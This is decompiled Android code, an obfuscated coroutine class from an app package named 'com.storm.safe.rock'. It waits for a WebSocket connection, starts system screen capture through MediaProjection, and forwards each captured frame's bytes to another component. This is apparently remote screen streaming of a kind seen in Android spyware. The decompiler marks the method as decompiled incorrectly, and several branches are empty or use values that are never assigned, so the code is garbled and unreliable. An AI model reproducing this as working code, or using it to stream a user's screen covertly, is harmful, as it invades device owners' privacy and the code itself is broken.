package com.storm.safe.rock.manager;

import android.content.Intent;
import com.storm.safe.rock.AbstractC0241a0;
import com.storm.safe.rock.service.MediaDisplayService;
import com.storm.safe.rock.service.modules.C0323a8;
import kotlin.Pair;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import p000.C1351vv;
import p000.InterfaceC0876mv;
import p000.InterfaceC0920no;
import p000.InterfaceC1116qn;
import p000.b81;
import p000.h10;
import p000.kg1;
import p000.l10;
import p000.t60;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
@InterfaceC1116qn(m214402c = "com.storm.safe.rock.manager.etzbzyzqxvqm$startMediaProjectionCapture$2", m214403f = "etzbzyzqxvqm.kt", m214404l = {514, 535}, m214405m = "invokeSuspend")
/* loaded from: classes2.dex */
final class etzbzyzqxvqm$startMediaProjectionCapture$2 extends SuspendLambda implements l10 {

    /* renamed from: a1 */
    public C0323a8 f52177a1;

    /* renamed from: a2 */
    public int f52178a2;

    /* renamed from: a3 */
    public int f52179a3;

    /* renamed from: a4 */
    public final /* synthetic */ C0263a5 f52180a4;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public etzbzyzqxvqm$startMediaProjectionCapture$2(C0263a5 c0263a5, InterfaceC0876mv interfaceC0876mv) {
        super(2, interfaceC0876mv);
        this.f52180a4 = c0263a5;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
        return new etzbzyzqxvqm$startMediaProjectionCapture$2(this.f52180a4, interfaceC0876mv);
    }

    @Override // p000.l10
    public final Object invoke(Object obj, Object obj2) {
        return ((etzbzyzqxvqm$startMediaProjectionCapture$2) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2)).invokeSuspend(C1351vv.f60710b1);
    }

    /* JADX WARN: Removed duplicated region for block: B:24:0x004e  */
    /* JADX WARN: Removed duplicated region for block: B:32:0x0065 A[Catch: Exception -> 0x0019, TryCatch #0 {Exception -> 0x0019, blocks: (B:7:0x0014, B:50:0x00b6, B:42:0x009c, B:46:0x00a8, B:51:0x00b9, B:53:0x00bf, B:57:0x00cf, B:56:0x00c6, B:58:0x00d9, B:14:0x0028, B:29:0x005f, B:22:0x004a, B:26:0x0052, B:30:0x0061, B:32:0x0065, B:34:0x0070, B:36:0x0074, B:39:0x007f, B:41:0x008d, B:59:0x00df, B:60:0x00e5, B:33:0x006b, B:17:0x002f, B:19:0x0039, B:21:0x003d), top: B:65:0x000c }] */
    /* JADX WARN: Removed duplicated region for block: B:33:0x006b A[Catch: Exception -> 0x0019, TryCatch #0 {Exception -> 0x0019, blocks: (B:7:0x0014, B:50:0x00b6, B:42:0x009c, B:46:0x00a8, B:51:0x00b9, B:53:0x00bf, B:57:0x00cf, B:56:0x00c6, B:58:0x00d9, B:14:0x0028, B:29:0x005f, B:22:0x004a, B:26:0x0052, B:30:0x0061, B:32:0x0065, B:34:0x0070, B:36:0x0074, B:39:0x007f, B:41:0x008d, B:59:0x00df, B:60:0x00e5, B:33:0x006b, B:17:0x002f, B:19:0x0039, B:21:0x003d), top: B:65:0x000c }] */
    /* JADX WARN: Removed duplicated region for block: B:36:0x0074 A[Catch: Exception -> 0x0019, TryCatch #0 {Exception -> 0x0019, blocks: (B:7:0x0014, B:50:0x00b6, B:42:0x009c, B:46:0x00a8, B:51:0x00b9, B:53:0x00bf, B:57:0x00cf, B:56:0x00c6, B:58:0x00d9, B:14:0x0028, B:29:0x005f, B:22:0x004a, B:26:0x0052, B:30:0x0061, B:32:0x0065, B:34:0x0070, B:36:0x0074, B:39:0x007f, B:41:0x008d, B:59:0x00df, B:60:0x00e5, B:33:0x006b, B:17:0x002f, B:19:0x0039, B:21:0x003d), top: B:65:0x000c }] */
    /* JADX WARN: Removed duplicated region for block: B:37:0x007c  */
    /* JADX WARN: Removed duplicated region for block: B:39:0x007f A[Catch: Exception -> 0x0019, TryCatch #0 {Exception -> 0x0019, blocks: (B:7:0x0014, B:50:0x00b6, B:42:0x009c, B:46:0x00a8, B:51:0x00b9, B:53:0x00bf, B:57:0x00cf, B:56:0x00c6, B:58:0x00d9, B:14:0x0028, B:29:0x005f, B:22:0x004a, B:26:0x0052, B:30:0x0061, B:32:0x0065, B:34:0x0070, B:36:0x0074, B:39:0x007f, B:41:0x008d, B:59:0x00df, B:60:0x00e5, B:33:0x006b, B:17:0x002f, B:19:0x0039, B:21:0x003d), top: B:65:0x000c }] */
    /* JADX WARN: Removed duplicated region for block: B:44:0x00a4  */
    /* JADX WARN: Removed duplicated region for block: B:53:0x00bf A[Catch: Exception -> 0x0019, TryCatch #0 {Exception -> 0x0019, blocks: (B:7:0x0014, B:50:0x00b6, B:42:0x009c, B:46:0x00a8, B:51:0x00b9, B:53:0x00bf, B:57:0x00cf, B:56:0x00c6, B:58:0x00d9, B:14:0x0028, B:29:0x005f, B:22:0x004a, B:26:0x0052, B:30:0x0061, B:32:0x0065, B:34:0x0070, B:36:0x0074, B:39:0x007f, B:41:0x008d, B:59:0x00df, B:60:0x00e5, B:33:0x006b, B:17:0x002f, B:19:0x0039, B:21:0x003d), top: B:65:0x000c }] */
    /* JADX WARN: Removed duplicated region for block: B:58:0x00d9 A[Catch: Exception -> 0x0019, TryCatch #0 {Exception -> 0x0019, blocks: (B:7:0x0014, B:50:0x00b6, B:42:0x009c, B:46:0x00a8, B:51:0x00b9, B:53:0x00bf, B:57:0x00cf, B:56:0x00c6, B:58:0x00d9, B:14:0x0028, B:29:0x005f, B:22:0x004a, B:26:0x0052, B:30:0x0061, B:32:0x0065, B:34:0x0070, B:36:0x0074, B:39:0x007f, B:41:0x008d, B:59:0x00df, B:60:0x00e5, B:33:0x006b, B:17:0x002f, B:19:0x0039, B:21:0x003d), top: B:65:0x000c }] */
    /* JADX WARN: Removed duplicated region for block: B:60:0x00e5 A[Catch: Exception -> 0x0019, TRY_LEAVE, TryCatch #0 {Exception -> 0x0019, blocks: (B:7:0x0014, B:50:0x00b6, B:42:0x009c, B:46:0x00a8, B:51:0x00b9, B:53:0x00bf, B:57:0x00cf, B:56:0x00c6, B:58:0x00d9, B:14:0x0028, B:29:0x005f, B:22:0x004a, B:26:0x0052, B:30:0x0061, B:32:0x0065, B:34:0x0070, B:36:0x0074, B:39:0x007f, B:41:0x008d, B:59:0x00df, B:60:0x00e5, B:33:0x006b, B:17:0x002f, B:19:0x0039, B:21:0x003d), top: B:65:0x000c }] */
    /* JADX WARN: Type inference failed for: r0v3, types: [com.storm.safe.rock.manager.etzbzyzqxvqm$startMediaProjectionCapture$2$1, kotlin.jvm.internal.Lambda] */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:27:0x005c -> B:29:0x005f). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:49:0x00b5 -> B:50:0x00b6). Please report as a decompilation issue!!! */
    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object invokeSuspend(Object obj) throws Throwable {
        C0323a8 c0323a8;
        int i;
        Pair pair;
        MediaDisplayService.C0279a0 c0279a0;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i2 = this.f52179a3;
        int i3 = 0;
        try {
        } catch (Exception e) {
            t60.m214705c6("etzbzyzqxvqm", "❌ 启动系统投屏捕获失败", e);
        }
        if (i2 == 0) {
            kg1.m213544f4(obj);
            C0323a8 c0323a8M211471g5 = this.f52180a4.f52151a0.m211471g5();
            if (c0323a8M211471g5 != null && !c0323a8M211471g5.f53103a3) {
                t60.m214726f4("etzbzyzqxvqm", "⚠️ WebSocket未连接，触发重连...");
                c0323a8M211471g5.m211643a8();
                c0323a8M211471g5.m211669d6();
                c0323a8 = c0323a8M211471g5;
                i = 0;
                if (c0323a8.f53103a3) {
                }
                if (c0323a8.f53103a3) {
                }
            }
            Integer num = AbstractC0241a0.f51907a1;
            if (num != null) {
            }
            if (pair != null) {
            }
            return C1351vv.f60710b1;
        }
        if (i2 != 1) {
            if (i2 != 2) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            int i4 = this.f52178a2;
            kg1.m213544f4(obj);
            i3 = i4 + 1;
            c0279a0 = MediaDisplayService.f52303c1;
            if (c0279a0.getInstance() == null || i3 >= 50) {
                if (c0279a0.getInstance() != null) {
                    MediaDisplayService c0279a02 = c0279a0.getInstance();
                    if (c0279a02 != null) {
                        final C0263a5 c0263a5 = this.f52180a4;
                        c0279a02.f52323b4 = new h10() { // from class: com.storm.safe.rock.manager.etzbzyzqxvqm$startMediaProjectionCapture$2.1
                            {
                                super(1);
                            }

                            @Override // p000.h10
                            public final Object invoke(Object obj2) {
                                byte[] bArr = (byte[]) obj2;
                                t60.m214695b6(bArr, "frameData");
                                C0263a5.m211346a3(c0263a5, bArr);
                                return C1351vv.f60710b1;
                            }
                        };
                    }
                    this.f52180a4.f52152a1 = true;
                    t60.m214714d6("etzbzyzqxvqm", "✅ 系统投屏回调已设置 (startMediaProjectionCapture)");
                } else {
                    t60.m214704c5("etzbzyzqxvqm", "❌ 等待 MediaDisplayService 实例超时");
                }
                return C1351vv.f60710b1;
            }
            this.f52177a1 = null;
            this.f52178a2 = i3;
            this.f52179a3 = 2;
            if (b81.m210571b1(100L, this) != coroutineSingletons) {
                i4 = i3;
                i3 = i4 + 1;
                c0279a0 = MediaDisplayService.f52303c1;
                if (c0279a0.getInstance() == null) {
                }
                if (c0279a0.getInstance() != null) {
                }
                return C1351vv.f60710b1;
            }
            return coroutineSingletons;
        }
        i = this.f52178a2;
        c0323a8 = this.f52177a1;
        kg1.m213544f4(obj);
        i++;
        if (c0323a8.f53103a3 && i < 30) {
            this.f52177a1 = c0323a8;
            this.f52178a2 = i;
            this.f52179a3 = 1;
            if (b81.m210571b1(100L, this) == coroutineSingletons) {
                return coroutineSingletons;
            }
            i++;
            if (c0323a8.f53103a3) {
            }
            if (c0323a8.f53103a3) {
            }
            Integer num2 = AbstractC0241a0.f51907a1;
            if (num2 != null) {
            }
            if (pair != null) {
            }
            return C1351vv.f60710b1;
        }
        if (c0323a8.f53103a3) {
            t60.m214714d6("etzbzyzqxvqm", "✅ WebSocket重连成功");
        } else {
            t60.m214726f4("etzbzyzqxvqm", "⚠️ WebSocket重连超时，投屏可能显示不出来");
        }
        Integer num22 = AbstractC0241a0.f51907a1;
        pair = num22 != null ? new Pair(num22, AbstractC0241a0.f51908a2) : null;
        if (pair != null) {
            int iIntValue = ((Number) pair.f57556a0).intValue();
            Intent intent = (Intent) pair.f57557a1;
            if (intent != null) {
                MediaDisplayService.f52303c1.start(this.f52180a4.f52151a0, iIntValue, intent, C0263a5.f52144b0.getCaptureQuality());
                c0279a0 = MediaDisplayService.f52303c1;
                if (c0279a0.getInstance() == null) {
                }
                if (c0279a0.getInstance() != null) {
                }
            } else {
                t60.m214704c5("etzbzyzqxvqm", "❌ 权限数据无效");
            }
        } else {
            t60.m214704c5("etzbzyzqxvqm", "❌ 没有权限数据");
        }
        return C1351vv.f60710b1;
    }
}
